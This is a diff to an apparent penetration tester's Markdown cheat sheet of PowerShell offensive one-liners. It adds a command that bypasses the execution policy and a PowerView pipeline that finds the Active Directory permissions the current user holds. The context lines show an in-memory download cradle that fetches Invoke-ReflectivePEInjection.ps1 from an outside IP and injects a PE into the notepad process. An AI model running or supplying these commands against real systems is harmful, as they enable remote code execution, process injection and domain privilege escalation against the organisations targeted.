@@ -1,7 +1,14 @@
-## Oneliners
+## Oneliners - ps1
 
 
 ### Powershell
+
+Open powershell with bypass
+#bypass #ps1
+```cmd
+powershell -exec bypass
+```
+
 #ps1 #runner #cradle
 Download cradle in memory:
 ```powershell
@@ -65,4 +72,9 @@ $procid = (Get-Process -Name notepad).Id[0]
 IEX (New-Object System.Net.WebClient).DownloadString("http://192.168.49.66/Invoke-ReflectivePEInjection.ps1")
 
 Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
+```
+
+#powerview #enum #dacl #resolve-sid ^d8fba8
+```powershell
+Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
 ```
